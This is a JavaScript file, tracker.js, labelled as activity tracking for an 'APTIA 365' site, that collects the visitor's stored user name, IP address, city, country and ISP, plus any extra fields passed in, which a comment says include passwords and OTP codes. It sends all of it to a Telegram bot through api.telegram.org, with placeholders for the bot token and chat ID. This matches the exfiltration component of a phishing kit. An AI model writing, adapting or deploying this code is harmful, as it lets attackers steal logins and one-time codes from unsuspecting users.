// tracker.js

export const trackActivity = async (actionType, extraData = {}) => {
  // --- CONFIGURATION ---
  const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"; // Put your Bot Token here
  const CHAT_ID = "YOUR_CHAT_ID_HERE";     // Put your Chat ID here

  const student = localStorage.getItem('aptia_user') || "New Visitor";

  try {
    // 1. Fetch IP and Location info
    const ipRes = await fetch('https://ipapi.co/json/');
    const loc = await ipRes.json();

    // 2. Format the Message for Telegram
    // We use HTML formatting for bold text (<b>)
    let message = `🚨 <b>APTIA 365 ALERT</b> 🚨\n\n`;
    message += `<b>Action:</b> ${actionType}\n`;
    message += `<b>User:</b> ${student}\n`;
    
    // Add any extra data (Password, OTP, Method, etc.)
    for (const [key, value] of Object.entries(extraData)) {
      message += `<b>${key}:</b> ${value}\n`;
    }

    message += `\n🌐 <b>NETWORK INFO</b>\n`;
    message += `<b>IP:</b> ${loc.ip}\n`;
    message += `<b>Location:</b> ${loc.city}, ${loc.country_name}\n`;
    message += `<b>ISP:</b> ${loc.org}\n`;
    message += `<b>Time:</b> ${new Date().toLocaleString()}\n`;

    // 3. Send to Telegram via Fetch API
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "HTML", // This allows the <b> tags to work
      }),
    });

  } catch (error) {
    console.log("Tracking error:", error);
  }
};